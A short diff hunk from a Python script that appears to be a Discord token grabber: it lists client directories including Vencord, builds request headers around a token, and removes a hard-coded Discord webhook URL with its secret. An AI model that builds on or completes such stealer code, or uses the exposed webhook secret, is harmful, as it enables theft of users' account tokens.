@@ -42,8 +42,6 @@ PATHS = {
     'Vencord': ROAMING + '\\Vencord'  # Added Vencord directory
 }
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH"
-
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
